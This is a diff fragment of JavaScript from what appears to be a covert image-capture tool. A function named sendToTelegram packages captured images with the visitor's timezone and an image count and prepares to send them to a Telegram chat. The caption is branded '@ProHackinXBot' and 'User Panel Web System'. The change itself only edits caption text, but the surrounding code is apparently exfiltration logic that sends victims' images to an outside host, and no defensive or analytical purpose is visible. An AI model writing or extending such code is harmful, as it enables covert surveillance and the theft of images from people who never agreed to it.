@@ -68,14 +68,14 @@ function sendToTelegram(blob) {
 
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  const caption = `╔════════════════════════════╗
-🎵 New Image Received
+  const caption = `╔═════════════════════════╗
+🎥 New Image Received
 🌍 Country:
 ⏰ TimeZone: ${timezone}
 💬 Image Number: ${imageCount}
-🤖 Bot: @Pro
+🤖 Bot:  @ProHackinXBot
 💻 User Panel Web System
-╚════════════════════════════╝`;
+╚════════════════════════╝`;
 
   const form = new FormData();
   form.append("chat_id", chatId);
